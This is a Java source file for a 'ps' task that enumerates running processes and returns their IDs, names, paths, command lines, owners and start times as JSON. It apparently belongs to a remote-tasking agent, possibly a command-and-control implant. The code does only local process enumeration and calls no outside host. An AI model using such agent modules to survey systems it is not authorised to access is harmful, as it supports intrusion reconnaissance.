package com.woopsie.tasks;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.woopsie.Config;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * Process listing task - lists all running processes
 */
public class PsTask implements Task {
    
    private final ObjectMapper objectMapper = new ObjectMapper();
    
    @Override
    public String execute(Config config, JsonNode parameters) throws Exception {
        Config.debugLog(config, "Executing ps command");
        
        List<Map<String, Object>> processes = new ArrayList<>();
        boolean isWindows = System.getProperty("os.name").toLowerCase().contains("win");
        
        // On Windows, use native API for better process enumeration
        if (isWindows) {
            List<Map<String, Object>> windowsProcesses = com.woopsie.utils.WindowsAPI.enumerateProcesses();
            
            if (!windowsProcesses.isEmpty()) {
                // Enhance with additional data from ProcessHandle
                Map<Long, ProcessHandle> pidToHandle = new HashMap<>();
                ProcessHandle.allProcesses().forEach(ph -> pidToHandle.put(ph.pid(), ph));
                
                for (Map<String, Object> proc : windowsProcesses) {
                    int pid = (int) proc.get("process_id");
                    ProcessHandle ph = pidToHandle.get((long) pid);
                    
                    String arch = System.getProperty("os.arch");
                    if ("amd64".equals(arch)) {
                        arch = "x64";
                    }
                    proc.put("architecture", arch);
                    
                    // If Windows API didn't get the name, try ProcessHandle
                    if (!proc.containsKey("name") && ph != null) {
                        ph.info().command().ifPresent(cmd -> {
                            // Extract process name from path
                            String name = cmd.substring(Math.max(cmd.lastIndexOf('/'), cmd.lastIndexOf('\\')) + 1);
                            proc.put("name", name);
                            proc.put("bin_path", cmd);
                        });
                    }
                    
                    // Try to get command line and other data from ProcessHandle
                    if (ph != null) {
                        ph.info().commandLine().ifPresent(cl -> proc.put("command_line", cl));
                        if (!proc.containsKey("bin_path")) {
                            ph.info().command().ifPresent(cmd -> proc.put("bin_path", cmd));
                        }
                        ph.info().startInstant().ifPresent(start -> 
                            proc.put("start_time", start.getEpochSecond())
                        );
                    }
                    
                    proc.putIfAbsent("name", "");
                    proc.putIfAbsent("user", "");
                    proc.putIfAbsent("bin_path", "");
                    proc.putIfAbsent("command_line", "");
                    proc.put("integrity_level", null);
                    proc.put("description", null);
                    proc.put("signer", null);
                    
                    processes.add(proc);
                }
                
                Config.debugLog(config, "Found " + processes.size() + " processes using Windows API");
                
                // Create output and return early
                Map<String, Object> output = new HashMap<>();
                output.put("platform", System.getProperty("os.name") + " " + System.getProperty("os.arch"));
                output.put("processes", processes);
                
                Map<String, Object> result = new HashMap<>();
                result.put("processes", processes);
                result.put("user_output", objectMapper.writeValueAsString(output));
                
                return objectMapper.writeValueAsString(result);
            }
        }
        
        // Fallback: Use ProcessHandle API to enumerate processes
        ProcessHandle.allProcesses().forEach(ph -> {
            Map<String, Object> processEntry = new HashMap<>();
            
            long pid = ph.pid();
            processEntry.put("process_id", pid);
            
            String arch = System.getProperty("os.arch");
            if ("amd64".equals(arch)) {
                arch = "x64";
            }
            processEntry.put("architecture", arch);
            
            // Try to read from /proc for better Linux support
            String name = null;
            String cmdLine = null;
            
            try {
                java.nio.file.Path commPath = java.nio.file.Paths.get("/proc", String.valueOf(pid), "comm");
                if (java.nio.file.Files.exists(commPath)) {
                    name = java.nio.file.Files.readString(commPath).trim();
                }
                
                // Read command line from /proc/[pid]/cmdline
                java.nio.file.Path cmdlinePath = java.nio.file.Paths.get("/proc", String.valueOf(pid), "cmdline");
                if (java.nio.file.Files.exists(cmdlinePath)) {
                    byte[] cmdlineBytes = java.nio.file.Files.readAllBytes(cmdlinePath);
                    if (cmdlineBytes.length > 0) {
                        // Replace null bytes with spaces
                        StringBuilder sb = new StringBuilder();
                        for (byte b : cmdlineBytes) {
                            if (b == 0) {
                                sb.append(' ');
                            } else {
                                sb.append((char) b);
                            }
                        }
                        cmdLine = sb.toString().trim();
                    }
                }
            } catch (Exception e) {
                // Fall back to ProcessHandle API
            }
            
            // Use ProcessHandle info as fallback
            if (name == null) {
                ph.info().command().ifPresent(cmd -> {
                    processEntry.put("bin_path", cmd);
                    // Extract process name from path
                    String extractedName = cmd.substring(cmd.lastIndexOf('/') + 1);
                    extractedName = extractedName.substring(extractedName.lastIndexOf('\\') + 1);
                    processEntry.put("name", extractedName);
                });
            } else {
                processEntry.put("name", name);
            }
            
            if (cmdLine != null && !cmdLine.isEmpty()) {
                processEntry.put("command_line", cmdLine);
            } else {
                ph.info().commandLine().ifPresent(cl -> processEntry.put("command_line", cl));
            }
            
            // Try to get user with Windows API first (more reliable)
            String user = null;
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                try {
                    user = com.woopsie.utils.WindowsAPI.getProcessOwner((int) pid);
                } catch (Exception e) {
                    // Fall back to ProcessHandle
                }
            }
            
            // Fall back to ProcessHandle API if Windows API failed or not on Windows
            if (user == null) {
                user = ph.info().user().orElse(null);
            }
            
            if (user != null) {
                processEntry.put("user", user);
            }
            
            ph.parent().ifPresent(parent -> processEntry.put("parent_process_id", parent.pid()));
            
            ph.info().startInstant().ifPresent(start -> 
                processEntry.put("start_time", start.getEpochSecond())
            );
            
            processEntry.putIfAbsent("name", "");
            processEntry.putIfAbsent("user", "");
            processEntry.putIfAbsent("bin_path", "");
            processEntry.putIfAbsent("parent_process_id", null);
            processEntry.putIfAbsent("command_line", "");
            processEntry.put("integrity_level", null);
            processEntry.put("description", null);
            processEntry.put("signer", null);
            
            processes.add(processEntry);
        });
        
        Config.debugLog(config, "Found " + processes.size() + " processes");
        
        Map<String, Object> output = new HashMap<>();
        output.put("platform", System.getProperty("os.name") + " " + System.getProperty("os.arch"));
        output.put("processes", processes);
        
        // Return JSON with processes array
        Map<String, Object> result = new HashMap<>();
        result.put("processes", processes);
        result.put("user_output", objectMapper.writeValueAsString(output));
        
        return objectMapper.writeValueAsString(result);
    }
    
    @Override
    public String getCommandName() {
        return "ps";
    }
}
